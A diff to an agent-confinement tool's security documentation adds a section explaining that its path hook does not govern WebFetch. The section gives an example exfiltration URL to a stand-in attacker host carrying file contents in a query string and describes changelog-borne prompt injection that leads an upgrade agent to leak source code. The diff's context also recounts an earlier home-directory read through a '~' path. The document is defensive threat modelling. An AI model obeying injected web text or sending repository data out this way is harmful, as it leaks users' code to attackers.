@@ -139,8 +139,38 @@ in for `cwd` — which is resolved and checked rather than skipped past.
 `Grep {"path": "~"}` resolved to `<root>/~` — inside the root, therefore
 allowed — while the agent read the user's whole home directory.
 
-Web tools are not confined: an agent with `WebFetch` can still send what it read
-under `cwd` to a URL.
+### What confinement does not cover
+
+The boundary guards **filesystem reads. It does not guard what leaves the
+machine.**
+
+`confine` only intercepts the tools that take a path — `Read`, `Grep`, `Glob`.
+Anything else it waves straight through, and that includes `WebFetch`. A URL is
+not a path, so a path-matching hook has nothing to say about it. `Read
+~/.ssh/id_rsa` is denied; `WebFetch` is not consulted.
+
+What that leaves open is narrow but real. `Bash`, `Write` and `Edit` are
+hard-disallowed, so there is no direct route out — but `WebFetch` takes a URL,
+and a URL carries data in its query string. An agent that read a file under `cwd`
+can fetch `https://attacker.example/x?d=<the contents>`. Scope is repository
+contents, not arbitrary files: `~/.ssh/id_rsa` is still unreadable.
+
+The sharpest case is this crate's own. `research` and `upgrade` deliberately hand
+an agent both `WebFetch` *and* repo contents — an `upgrade` agent reads your
+manifest and then visits changelog pages it did not write. That is prompt
+injection with a network egress: a changelog can address the agent directly and
+ask it to fetch a URL with your source in it. The hook is irrelevant to that
+call, because it is not a path.
+
+Closing it is not a patch to the hook; the hook is doing the job it can do.
+It is egress control:
+
+- drop `WebFetch` and keep `WebSearch`, which returns results without the agent
+  making its own outbound requests — cheap, and keeps most of the value; or
+- pin the call to an egress proxy that only resolves public hosts.
+
+Treat any agent holding `WebFetch` over an untrusted repo as able to send that
+repo to whoever the web tells it to.
 
 ### Environment
 
